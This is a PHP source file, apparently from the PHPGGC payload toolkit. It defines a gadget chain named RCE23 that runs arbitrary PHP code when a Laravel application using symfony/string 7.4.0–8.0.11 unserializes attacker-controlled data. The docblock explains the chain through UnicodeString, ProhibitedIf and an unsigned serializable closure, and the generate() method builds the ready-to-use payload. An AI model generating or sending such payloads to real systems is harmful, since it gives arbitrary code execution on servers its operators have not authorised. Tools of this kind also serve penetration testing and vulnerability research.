<?php

namespace GadgetChain\Laravel;

class RCE23 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = 'symfony/string 7.4.0 <= 8.0.11';
    public static $vector = '__unserialize';
    public static $author = 'Mechazawa';
    public static $information = '
        Runs arbitrary PHP code through a serialized Laravel closure.

        Symfony\\Component\\String\\UnicodeString is used as a trampoline. When
        __unserialize() runs $this->string = $data["string"], the value is
        coerced to the typed "string" property, calling __toString() on the
        assigned Illuminate\\Validation\\Rules\\ProhibitedIf. ProhibitedIf::
        __toString() then invokes the UnsignedSerializableClosure stored as its
        condition, executing the wrapped closure (no signing key required).

        Requires laravel/serializable-closure. Only symfony/string releases that
        both type the "string" property and assign it inside __unserialize() are
        affected: the 7.4 and 8.0 lines. Symfony hardened the component to reject
        Stringable objects during unserialization (2026-05-23), shipped in
        7.4.13 / 8.0.12 / 8.1.0, so patched releases are safe. 6.4 and earlier are
        not affected, as the property is untyped there and the is_string() guard
        in __wakeup() stops the chain.
    ';

    public function generate(array $parameters)
    {
        $native = new \Laravel\SerializableClosure\Serializers\Native($parameters['code']);
        $closure = new \Laravel\SerializableClosure\UnsignedSerializableClosure($native);
        $prohibited = new \Illuminate\Validation\Rules\ProhibitedIf($closure);

        return new \Symfony\Component\String\UnicodeString($prohibited);
    }
}
